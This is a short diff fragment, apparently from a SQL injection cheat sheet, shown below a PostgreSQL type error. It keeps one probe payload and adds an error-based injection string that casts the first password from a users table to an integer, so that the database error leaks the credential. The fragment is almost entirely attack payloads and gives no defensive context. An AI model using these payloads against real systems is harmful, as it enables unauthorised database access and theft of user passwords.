@@ -44,7 +44,7 @@ ERROR: argument of AND must be type boolean, not type integer
 
 - 'AND 1=CAST((SELECT 1) AS int)--
 
-
+- 'AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
 
 
 
